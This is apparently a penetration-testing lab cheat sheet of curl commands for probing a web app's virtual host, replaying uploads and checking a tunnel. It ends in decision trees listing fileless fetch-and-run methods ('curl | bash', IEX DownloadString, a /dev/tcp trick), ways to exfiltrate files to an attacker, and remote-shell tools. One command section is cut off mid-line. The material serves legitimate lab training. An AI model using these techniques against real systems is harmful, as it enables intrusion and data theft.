## Request the observed virtual host

**Run in:** Kali. **Requires:** Observed hostname and target address; plain HTTP port 80 in this example

```bash
curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -D evidence/web/app.headers -o evidence/web/app.body http://app.lab.htb/
```

**What the result establishes:** The response belongs to the requested application host, assuming the server routes that hostname.

**Next check:** Map features in the browser and capture a normal request.

## Replay an ordinary multipart upload

**Run in:** Kali or the proxy request editor. **Requires:** A real sample.png, current session/token, and observed endpoint/field names

```bash
curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -b 'SESSION=REPLACE_ME' \
  -F 'csrf=FRESH_TOKEN' -F 'file=@sample.png;type=image/png' \
  -D evidence/web/upload.headers -o evidence/web/upload.body http://app.lab.htb/upload
```

**What the result establishes:** A server response that can be compared with the browser upload; record the returned object ID or path.

**Next check:** Change one property and compare the resulting storage/retrieval behavior.

## Retrieve the object using its returned location

**Run in:** Kali. **Requires:** Observed retrieval URL/ID and the uploading identity; replace 123

```bash
curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -b 'SESSION=REPLACE_ME' \
```

## Verify the forwarded application

**Run in:** Another Kali terminal. **Requires:** Established tunnel with Kali loopback listener on 18080

```bash
ss -lntp | grep ':18080'
curl -sS -D - http://127.0.0.1:18080/
```

**What the result establishes:** A listener and application response comparable to the direct pivot baseline.

**Next check:** Record the exact tested connection before expanding to other services.

## Download a file and fail on HTTP errors

**Run in:** Kali. **Requires:** A working route, trusted TLS chain and permission to read the URL; required session headers are separate inputs.

```bash
curl --fail --location --output file.bin 'https://HOST_FQDN/file.bin'
```

**What the result establishes:** Separate status, headers and body, and preserve the method, cookies and content type needed by the application.

**Next check:** Inspect the response chain and authentication context; verify the saved content before treating the transfer as complete.

## Commands

**Kali**

```bash
curl -I http://TARGET_IP/
curl -o file.zip http://TARGET_IP:8000/file.zip
curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
```

The upload command requires an uploadserver endpoint, not Python http.server.

## If it fails

| Symptom | Check |
| --- | --- |
| Redirect to another hostname | Inspect Location and resolve the intended application before following blindly. |
| Login/CSRF rejection | Re-establish session and fresh token, then replay the unchanged baseline. |
| HTTP success with unexpected HTML | Read Content-Type and body; verify URL, identity and redirect behavior before comparing file hashes. |
| Local connection works but backend fails | Recheck the service directly from the pivot and confirm the destination host/port. |
| The server returns a redirect, login page or HTTP error | Shell quoting and URL/form encoding happen at different layers; -d sends form data while -F builds multipart content. |

<Accordion title="Quick Decision Tree">

### Quick Decision Tree

**File Transfers for Linux and Windows**

```text
DOWNLOADING TO WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
├── Only cmd.exe?       → certutil or bitsadmin
├── Internal network?   → SMB (impacket-smbserver)
├── Need fileless?      → IEX + DownloadString
└── Nothing works?      → Base64 encode/decode via clipboard

DOWNLOADING TO LINUX:
├── Have curl/wget?     → Use them (simplest)
├── Need fileless?      → curl | bash  or  wget -qO- | python3
├── Have Python/PHP?    → Use language one-liners
├── Nothing available?  → /dev/tcp bash trick
└── Need encryption?    → OpenSSL s_server/s_client

UPLOADING FROM WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
├── Internal network?   → SMB or WebDAV
└── Nothing works?      → Base64 encode → copy-paste → decode on attacker

UPLOADING FROM LINUX:
├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
├── Have SCP?           → scp file user@attacker:/path/
├── Have Python?        → python3 requests.post one-liner
└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
```

```text
├── Linux → scp/sftp (22)
├── Windows → SMB (445) or evil-winrm download
├── Web → wget/curl
└── Simple → python3 -m http.server (on target)

"I need to get files onto the target"
├── Linux → scp/sftp (22) or wget from attacker
├── Windows → SMB, certutil, PowerShell wget
├── Web upload → if upload form exists
└── Simple → python3 -m http.server (on attacker)

"I need a shell"
├── Linux → SSH (22)
├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
```
